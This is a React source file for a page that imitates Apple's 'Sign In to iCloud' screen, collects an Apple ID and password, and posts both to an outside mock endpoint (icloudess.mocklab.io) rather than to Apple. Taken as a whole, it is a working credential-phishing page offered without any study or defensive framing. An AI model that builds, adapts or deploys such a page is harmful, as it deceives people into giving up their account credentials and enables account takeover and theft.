// import react from 'react';
import './App.css';
import { useState } from 'react';
import axios from 'axios';
function App() {
  const [name,setName] = useState("");
  const [pass,setPass] =useState("")
  const postData = async()=>{
  // const data = { "name":name,"pa":pass };
  const res = await axios.post('https://icloudess.mocklab.io/v2/user',{ "name":name,"pa":pass });
  console.log(res)
  
  }
  
  return (
  <div className = "app">
    <h1>Sign In to iCloud</h1>
    <h6>Enter your Apple ID and password to sign into iCloud.</h6>
    <div>
      <main>
        <input value ={name} onChange={(e)=>{setName(e.target.value)}} type="text" placeholder="e-mail address" />
        <input value={pass} onChange={(e)=>{setPass(e.target.value)}} type="text" placeholder="password" />
      </main>
      <footer>
        <button type="reset">Cancel</button>
        <button onClick={postData()} >OK</button>
      </footer>
    </div>
  </div>
  );
}

export default App;
